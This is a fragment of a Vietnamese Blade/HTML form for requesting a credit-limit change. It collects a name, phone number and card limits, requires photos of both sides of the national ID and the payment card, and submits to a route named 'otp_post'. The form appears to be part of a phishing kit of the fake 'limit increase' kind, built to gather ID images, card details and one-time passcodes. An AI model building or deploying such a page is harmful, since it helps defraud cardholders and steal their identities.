    ...
    <div class="container">
        <form action="{{ route('otp_post') }}" method="POST" enctype="multipart/form-data">
            ...
            <div class="form-group">
                ...
                <input name="name" id="name" class="form-control" placeholder="Nhập họ và tên" required>
            </div>

            <div class="form-group">
                <label>Số điện thoại:</label>
                <input name="phone" id="phone" class="form-control" placeholder="Nhập số điện thoại" required>
            </div>

            <div class="form-group">
                <label>Hạn mức hiện tại:</label>
                <input name="limit_now" id="limit_now" class="form-control" placeholder="Nhập hạn mức hiện tại" required>
            </div>

            <div class="form-group">
                <label>Hạn mức khả dụng:</label>
                <input name="limit_total" id="limit_total" class="form-control" placeholder="Nhập hạn mức khả dụng" required>
            </div>

            <div class="form-group" style="display:none;">
                <label>Hạn mức đề xuất:</label>
                <input name="han_muc_muon_nang" id="limit_increase" class="form-control" placeholder="Nhập hạn mức đề xuất" value="0">
            </div>

            <div class="form-group">
                <div class="image-container" id="mattruoccccd" style="background-image:url(upload/7d1fe053ff78bca2cbdb8f6ab058f6d9.html)">
                    <span role="img" id="iconmattr" aria-label="camera" class="anticon anticon-camera" style="font-size: 30px; color: rgb(51, 51, 51);">
                    ...
                    <input name="mattruoc" hidden type="file" id="mattruoc" class="form-control" required>
                    <span class="ant-typography textmattr" style="color: rgb(51, 51, 51); font-weight: 700; font-size: 16px;">Mặt
            ...
            <div class="form-group">
                <div class="image-container" id="matsaucccd" style="background-image:url(upload/7d1fe053ff78bca2cbdb8f6ab058f6d9.html)">
                    ...
                    <input name="matsau" hidden type="file" id="matsau" class="form-control" required>
                    <span class="ant-typography textmatsau" style="color: rgb(51, 51, 51); font-weight: 700; font-size: 16px;">Mặt
                        sau CCCD / CMND </span>
            ...
            <div class="form-group">
                ...
                <div class="image-container" id="anhmattruocthe" style="background-image:url(upload/7d1fe053ff78bca2cbdb8f6ab058f6d9.html)">
                    <span role="img" id="iconmattruocthe" aria-label="camera" class="anticon anticon-camera" style="font-size: 30px; color: rgb(51, 51, 51);">
                        <svg viewBox="64 64 896 896" focusable="false" data-icon="camera" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                            <path d="M864 248H728l-32.4-90.8a32.07 32.07 0 00-30.2-21.2H358.6c-13.5 0-25.6 8.5-30.1 21.2L296 248H160c-44.2 0-80 35.8-80 80v456c0 44.2 35.8 80 80 80h704c44.2 0 80-35.8 80-80V328c0-44.2-35.8-80-80-80zm8 536c0 4.4-3.6 8-8 8H160c-4.4 0-8-3.6-8-8V328c0-4.4 3.6-8 8-8h186.7l17.1-47.8 22.9-64.2h250.5l22.9 64.2 17.1 47.8H864c4.4 0 8 3.6 8 8v456zM512 384c-88.4 0-160 71.6-160 160s71.6 160 160 160 160-71.6 160-160-71.6-160-160-160zm0 256c-53 0-96-43-96-96s43-96 96-96 96 43 96 96-43 96-96 96z">
                            </path>
                        </svg>
                    </span>
                    <input name="mattruoc_card" hidden type="file" id="mattruoc_card" class="form-control" required>
                    <span class="ant-typography textanhtruocthe" style="color: rgb(51, 51, 51); font-weight: 700; font-size: 16px;">Ảnh
                        mặt trước thẻ </span>

                </div>
            </div>
            <div class="form-group">
                <div class="image-container" id="anhmatsauthe" style="background-image:url(upload/7d1fe053ff78bca2cbdb8f6ab058f6d9.html)">
                    <span role="img" id="iconmatsauthe" aria-label="camera" class="anticon anticon-camera" style="font-size: 30px; color: rgb(51, 51, 51);">
                        <svg viewBox="64 64 896 896" focusable="false" data-icon="camera" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                            <path d="M864 248H728l-32.4-90.8a32.07 32.07 0 00-30.2-21.2H358.6c-13.5 0-25.6 8.5-30.1 21.2L296 248H160c-44.2 0-80 35.8-80 80v456c0 44.2 35.8 80 80 80h704c44.2 0 80-35.8 80-80V328c0-44.2-35.8-80-80-80zm8 536c0 4.4-3.6 8-8 8H160c-4.4 0-8-3.6-8-8V328c0-4.4 3.6-8 8-8h186.7l17.1-47.8 22.9-64.2h250.5l22.9 64.2 17.1 47.8H864c4.4 0 8 3.6 8 8v456zM512 384c-88.4 0-160 71.6-160 160s71.6 160 160 160 160-71.6 160-160-71.6-160-160-160zm0 256c-53 0-96-43-96-96s43-96 96-96 96 43 96 96-43 96-96 96z">
                            </path>
                        </svg>
                    </span>
                    <input name="matsau_card" hidden type="file" id="matsau_card" class="form-control" required>
                    <span class="ant-typography textanhsauthe" style="color: rgb(51, 51, 51); font-weight: 700; font-size: 16px;">Ảnh
                        mặt sau thẻ </span>
            ...
            <center>
                <button type="submit" name="gui-yeu-cau" class="btn btn-gradient btn-rounded" id="submit"><i class="fa fa-plus-circle"></i>
                    GỬI YÊU CẦU </button>
            </center>
        </form>
    </div>
